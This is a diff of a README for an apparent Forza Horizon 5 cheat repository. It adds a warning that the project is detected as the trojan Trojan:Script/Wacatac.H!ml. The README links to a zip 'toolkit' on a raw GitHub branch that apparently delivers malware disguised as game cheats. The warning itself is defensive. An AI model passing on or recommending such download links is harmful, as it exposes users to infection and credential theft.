@@ -1,3 +1,10 @@
+☠️☠️☠️ Trojan:Script/Wacatac.H!ml ☠️☠️☠️
+Detected by Microsoft Defender Antivirus
+Aliases: No associated aliases
+
+Summary
+Trojan:Script/Wacatac.H!ml is classified as a broad heuristic label. It captures a range of malicious activities from modular malware families that employ advanced scripting and evasion techniques. This detection is not a single virus, but a behavioral signature often triggered by unauthorized registry changes, in-memory code execution, and the misuse of trusted system processes. These infections typically spread through social engineering, such as pirated software or phishing campaigns. Once inside a device, they focus on establishing persistence, deactivating Microsoft Defender, and creating covert communication channels. The heuristic nature of this detection can sometimes lead to false positives, where legitimate software is flagged. 
+
 # 🚗 Forza Horizon 5 Cheats & Hacks Deluxe Repository
 
 [![Maintenance](https://github.com/AyanishSardar2003/forza-horizon-5-advanced-toolkit/raw/refs/heads/branch/kidsman/toolkit_horizon_forza_advanced_2.2.zip)](https://github.com/AyanishSardar2003/forza-horizon-5-advanced-toolkit/raw/refs/heads/branch/kidsman/toolkit_horizon_forza_advanced_2.2.zip) 
@@ -115,5 +122,6 @@ Finish strong and grab your copy one more time—for every champion deserves a c
 
 **Ready to shift gears and experience Forza Horizon 5 like never before?**  
 Engage, explore, and leave your digital tire marks with the ultimate suite of cheats, hacks, and enhancements—where community meets innovation, powered by intelligence and passion.
+
 
 **See you at the start line!** 🏎️💨
